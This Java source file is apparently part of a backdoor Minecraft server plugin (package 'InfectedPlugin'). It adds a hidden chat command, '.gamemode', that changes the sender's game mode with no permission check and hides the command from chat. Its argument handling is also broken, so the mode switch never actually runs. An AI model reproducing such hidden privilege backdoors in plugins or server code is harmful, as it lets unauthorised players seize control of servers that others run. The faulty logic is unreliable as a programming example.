 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.*;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_gamemode implements Listener
 {
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
         boolean cancel = false;
         
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
             if (args == null)
             {
                 return;
             }
             
            if (args[0].equalsIgnoreCase(".gamemode"))
             {
                 if (args.length == 0)
                 {
                    p.sendMessage(ChatColor.RED + "Usage: .gamemode [survival] [creative] [adventure]");
                 }
                 if (args.length == 1)
                 {
                    if (args[0].equalsIgnoreCase("survival"))
                     {
                         p.setGameMode(GameMode.SURVIVAL);
                     }
                    else if (args[0].equalsIgnoreCase("creative"))
                     {
                         p.setGameMode(GameMode.CREATIVE);
                     }
                    else if (args[0].equalsIgnoreCase("adventure"))
                     {
                         p.setGameMode(GameMode.ADVENTURE);
                     }
                 }
                 cancel = true;
             }
         }
         
         if (cancel)
         {
             event.setCancelled(true);
             return;
         }
     }
 }
